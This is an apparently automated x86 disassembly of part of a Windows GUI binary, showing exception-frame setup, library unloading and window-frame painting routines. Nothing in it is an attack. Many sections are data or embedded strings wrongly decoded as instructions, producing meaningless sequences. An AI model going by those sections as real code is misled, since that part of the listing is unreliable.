sub [ edi ] eax
xor al 0x5
inc ebx
add [ eax ] ch
sub [ edi ] eax
sub al 0x5
inc ebx
add [ eax ] ah
sub [ edi ] eax
and al 0x5
inc ebx
add [ eax ] bl
sub [ edi ] eax
sbb al 0x5
inc ebx
add [ eax ] dl
sub [ edi ] eax
adc al 0x5
inc ebx
add [ eax ] cl
sub [ edi ] eax
or al 0x5
inc ebx
add [ eax ] al
sub [ edi ] eax
add al 0x5
inc ebx
add al bh
sub [ edi ] al
cld
add al 0x43
add al dh
sub [ edi ] al
hlt
sub_430836
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43085d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430864
retn
sub_430870
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4308a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4308a8
retn
mov eax [ rw-data ]
call sub_40324c
sub_430958
or al [ eax ]
add [ eax ] al
sub al [ fs : edi ]
cmp al 0x93
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] ah
inc edi
add ah dl
xchg ecx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x47 ] bl
add [ ecx + edx * 4 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] bl
inc edi
add [ eax - 0x6e ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x47 ] dl
add [ eax - 0x6d ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] dl
inc edi
add al al
xchg ebp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x47 ] cl
add [ ebx + edx * 4 + 0x47 ] dh
add [ eax ] al
dec eax
sub al [ edi ]
dec eax
xchg esp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x47 ] al
add [ eax + 0x4795 ] ah
add [ eax ] al
add [ eax + 0x2a ] al
inc edi
add [ eax + 0x4791 ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430a00
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430a07
retn
call sub_43093c
sub_430a34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430a59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430a60
retn
sub_430a7b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430ac0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430ac7
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a50
sub_430ae3
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430b28
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430b2f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a50
sub_430b3f
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430b95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430b9c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403f9c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_430ba8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430bec
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430bf3
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_430c00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430c25
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430c2c
retn
sub_430c38
test [ ebx + eax * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx + 0x40043 ] cl
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ eax ] dl
or eax 0xd240043
inc ebx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add al 0x0
add [ eax ] al
nop
push sub_430da7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430dae
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a04
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a04
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_430d38
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430da7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430dae
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a04
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a04
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_431000
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42c784
mov [ esi + 0x5 ] al
call sub_430cd8
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_431844
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43104c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_4310ec
call sub_42c5c4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_431080
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_4310ec
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_431130
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_431080
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43117c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_431080
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4311c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_431080
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_431228
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404814
push eax
mov eax esi
call sub_404804
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_431080
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43128c
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_431310
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43134c
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_431369 ]
jmp [ eax * 4 + jump_table_4313d2 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4316d8
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_431833
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_431310
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43117c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_418e04
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43185e
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43189b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4318a2
retn
mov eax [ rw-data ]
call sub_40324c
mov eax rw-data
call sub_403f9c
sub_431eca
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070023 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
push cs
add [ eax ] al
js r-xdata
mov esp 0x180043b8
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
jo r-xdata
cmp [ ecx + 0x1b80043 ] 0x0
push eax
outsd
jo r-xdata
inc edi
je r-xdata
dec esp
jns r-xdata
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ esi ] cl
mov ecx 0x1b80043
add bh bh
mov eax 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
jo r-xdata
sub [ esi + 0xe00043 ] dh
add bh bh
loopne r-xdata
imul esi [ ebp + 0x49 ] 0x286f666e
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
mov edx 0x1d00043
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : 0x65476e4f ] cl
je r-xdata
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
dec edi
jb r-xdata
add [ eax + 0x4f0a0027 ] al
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9421f35
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0026 ] al
outsb
inc esp
jb r-xdata
mov bh 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
popad
add [ eax ] ch
add [ eax ] eax
[ eax ]
rcr [ eax + 0x21 ] 0x43
add [ ebx ] al
or edx [ esp + edx * 2 + 0x65 ]
js r-xdata
push ebp
jo r-xdata
or [ ebx + 0x74 ] dl
inc ebx
jb r-xdata
mov al [ 0xffffffffd80043b6 ]
add [ eax ] al
rol [ eax ] 0x1
jns r-xdata
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + 0x4f07002c ] al
add [ eax ] al
dec edi
jbe r-xdata
jb r-xdata
jo r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x47ffbb82 ] cl
and al 0x44
add [ eax - 0x23ffbbe8 ] dh
dec esp
popad
jns r-xdata
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add al ah
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ edx + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc esp
jb r-xdata
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec ecx
outsb
outsw
sub [ esi + 0xd00043 ] dh
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002d ] al
outsb
inc ebp
js r-xdata
outsb
inc ebp
outsb
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ edx ] cl
dec edi
mov ecx 0x1b00043
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
jae r-xdata
inc ebx
add [ edi ] al
add [ edx ] dl
mov al 0xe
mov al 0x6
mov al 0x13
mov al 0x14
mov al 0xc7
inc esi
call [ eax ]
inc ebx
add [ edi ] ch
inc ebx
add [ edi + 0x43 ] al
add al ah
inc ebx
add [ eax + ebp * 2 ] al
inc ebx
add [ 0x628c0043 ] dl
inc ebx
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
inc esp
jne r-xdata
je r-xdata
jb r-xdata
push ebx
je r-xdata
dec edi
outsb
loopne r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add al bh
inc ebx
add al ah
inc bx
in al 0x31
inc eax
add [ eax ] al
inc ebx
add [ eax - 0x73ffbcde ] ah
add [ eax ] eax
add [ eax + ecx * 8 + 0x43 ] ch
je r-xdata
adc [ bp + si + 0x43 ] bh
[ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080034 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ ebx ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffbcdd ] bh
cmpsd [ esi ] [ edi ]
inc ecx
add al bh
inc ebx
add al ah
inc bx
in al 0x31
inc eax
add [ eax ] al
xor al [ eax ]
mov [ esi + 0x44 ] bh
add [ eax - 0x4fffbbdc ] bh
sbb [ eax + eax - 0x24 ] al
je r-xdata
xor al [ eax ]
mov [ esi + 0x44 ] bh
add [ eax - 0x4fffbbdc ] bh
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + 0x43 ] dl
add [ 0x6f546c74 ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
push esp
and [ ebx ] eax
add eax 0x6f546c74
je r-xdata
inc esp
outsd
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x27ffbfcc ] ch
pop ss
add [ ecx + eax - 0x37940000 ] cl
inc ebx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
pop es
dec edi
add [ eax + eax ] cl
inc ebx
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
les esp [ ebx ]
inc ebx
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
and al 0x23
inc ebx
add [ eax + 0x32004322 ] dh
add [ eax ] cl
push ebx
je r-xdata
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x47ffbb82 ] cl
and al 0x44
add [ eax - 0x23ffbbe8 ] dh
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
lea eax [ eax ]
mov ah 0x22
inc ebx
add [ edi ] al
or al 0x54
inc ebx
jne r-xdata
or [ esp + ebp * 2 + 0x42 ] dh
add ah bl
inc ebx
outsb
je r-xdata
add [ eax + 0x4405 ] al
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
arpl [ eax + 0x6f ] bp
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
je r-xdata
popad
inc ebx
add [ eax + 0x13 ] cl
inc esp
add [ ebx + edx + 0x44 ] al
add [ esp + edx ] dl
inc esp
add [ eax ] cl
test [ ebx ] sub_43fe4c
mov al 0xfd
inc ebx
add al bl
push es
inc esp
add [ eax - 0xa ] dl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ eax ] al
inc bx
add ah cl
test [ ebx ] sub_440320
cwde
